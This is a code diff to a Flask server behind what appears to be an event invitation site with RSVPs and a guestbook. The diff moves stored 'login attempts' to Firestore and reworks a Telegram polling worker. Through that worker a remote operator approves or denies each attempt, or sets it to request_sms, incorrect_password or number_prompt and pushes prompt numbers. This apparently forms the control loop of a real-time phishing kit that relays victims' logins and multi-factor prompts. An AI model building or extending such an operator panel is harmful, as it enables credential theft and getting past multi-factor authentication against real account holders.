@@ -11,13 +11,16 @@ from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 from dotenv import load_dotenv
 
-# Load key configurations
 load_dotenv()
 
 app = Flask(__name__, static_folder='dist', static_url_path='/')
 CORS(app)
 
-# In-Memory Database / Mock Seed Data
+# ---------------------------------------------------------------------------
+# In-Memory seed data (rsvps, guestbook, playlist, logs stay in memory —
+# only login_attempts move to Firestore so the polling thread and HTTP
+# worker processes share the same state across process boundaries)
+# ---------------------------------------------------------------------------
 rsvps = [
     {
         "id": "rsvp-1",
@@ -37,7 +40,7 @@ rsvps = [
         "guestsCount": 1,
         "dietaryRestrictions": "None",
         "notes": "Wouldn't miss this landmark celebration for the world.",
-        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
+        "createdAt": datetime.utcnow().isoformat() + "Z"
     },
     {
         "id": "rsvp-3",
@@ -47,7 +50,7 @@ rsvps = [
         "guestsCount": 0,
         "dietaryRestrictions": "",
         "notes": "Sending all my love from Paris. Sad I cannot attend in person, but with you in spirit! ❤️",
-        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
+        "createdAt": datetime.utcnow().isoformat() + "Z"
     }
 ]
 
@@ -92,67 +95,95 @@ logs = [
     }
 ]
 
-active_login_attempts = {}
+# ---------------------------------------------------------------------------
+# Firebase init
+# ---------------------------------------------------------------------------
+try:
+    from firebase_db import get_db, save_attempt, get_attempt, update_attempt, get_all_attempts
+    get_db()  # eagerly initialise so we catch bad credentials at startup
+    print("[Firebase] Firestore connected successfully.", flush=True)
+except Exception as e:
+    print(f"[Firebase] ⚠️  Could not connect to Firestore: {e}", flush=True)
 
-# Telegram implementation is abstracted to a separate module for clarity
+# ---------------------------------------------------------------------------
+# Telegram service
+# ---------------------------------------------------------------------------
 try:
     from telegram_service import TelegramService
 except Exception as e:
     print(f"Failed to import TelegramService: {e}", flush=True)
 
 telegram_service = TelegramService()
-# Register routes from a separate module to keep server.py as the app entrypoint
+
+# ---------------------------------------------------------------------------
+# Register Flask routes
+# ---------------------------------------------------------------------------
 try:
     from routes import register_routes
-    register_routes(app, telegram_service, rsvps, guestbook, playlist, logs, active_login_attempts)
+    register_routes(app, telegram_service, rsvps, guestbook, playlist, logs)
 except Exception as e:
     print(f"Failed to import/register routes: {e}", flush=True)
 
-# --- TELEGRAM WORKER THREAD ---
+# ---------------------------------------------------------------------------
+# Telegram polling worker
+# ---------------------------------------------------------------------------
 def telegram_polling_worker():
-    print("[Telegram Polling] Polling background thread initiated...", flush=True)
-    
+    print("[Telegram Polling] Background thread started.", flush=True)
     while True:
         try:
             if telegram_service.is_configured():
                 def on_action(attempt_id, action, payload=None):
                     print(f"[ON_ACTION] id={attempt_id} action={action} payload={payload}", flush=True)
-                    attempt = active_login_attempts.get(attempt_id)
-                    if not attempt:
-                        print(f"[ON_ACTION] ⚠️ attempt_id {attempt_id} NOT FOUND in active_login_attempts", flush=True)
+                    try:
+                        attempt = get_attempt(attempt_id)
+                    except Exception as e:
+                        print(f"[ON_ACTION] Firestore read error: {e}", flush=True)
                         return
-                    if attempt:
-                        mapped_status = "pending"
-                        if action == "approve":
-                            mapped_status = "approved"
-                        elif action == "deny":
-                            mapped_status = "denied"
-                        else:
-                            mapped_status = action
-                        if payload and isinstance(payload, dict):
-                            if payload.get('chosen'):
-                                attempt['promptNumber'] = payload.get('chosen')
-                            if payload.get('candidates'):
-                                attempt['promptCandidates'] = payload.get('candidates')
-                        attempt["status"] = mapped_status
-                        logs.insert(0, {
-                            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
-                            "timestamp": datetime.utcnow().isoformat() + "Z",
-                            "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
-                            "details": f"[TELEGRAM COMMAND] Organizer dispatched [{mapped_status.upper()}] for {attempt.get('email')}.",
-                            "ipPlaceholder": "Telegram Remote"
-                        })
+
+                    if not attempt:
+                        print(f"[ON_ACTION] ⚠️  attempt_id {attempt_id} NOT FOUND in Firestore", flush=True)
+                        return
+
+                    # Map action string to status
+                    if action == "approve":
+                        mapped_status = "approved"
+                    elif action == "deny":
+                        mapped_status = "denied"
+                    else:
+                        mapped_status = action  # e.g. request_sms, incorrect_password, number_prompt
+
+                    fields = {"status": mapped_status}
+                    if payload and isinstance(payload, dict):
+                        if payload.get("chosen"):
+                            fields["promptNumber"] = str(payload["chosen"])
+                        if payload.get("candidates"):
+                            fields["promptCandidates"] = payload["candidates"]
+
+                    try:
+                        update_attempt(attempt_id, fields)
+                        print(f"[ON_ACTION] ✅ Firestore updated → status={mapped_status}", flush=True)
+                    except Exception as e:
+                        print(f"[ON_ACTION] Firestore write error: {e}", flush=True)
+                        return
+
+                    logs.insert(0, {
+                        "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
+                        "timestamp": datetime.utcnow().isoformat() + "Z",
+                        "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
+                        "details": f"[TELEGRAM COMMAND] Organizer dispatched [{mapped_status.upper()}] for {attempt.get('email')}.",
+                        "ipPlaceholder": "Telegram Remote"
+                    })
+
                 telegram_service.poll_updates(on_action)
         except Exception as e:
             print(f"[Telegram Polling Worker Exception] {e}", flush=True)
         time.sleep(1)
 
 
-# Always start polling thread regardless of how the app is launched
 _polling_thread = threading.Thread(target=telegram_polling_worker, daemon=True)
 _polling_thread.start()
 
-
+# ---------------------------------------------------------------------------
 if __name__ == "__main__":
     port = int(os.environ.get("FLASK_PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=False)
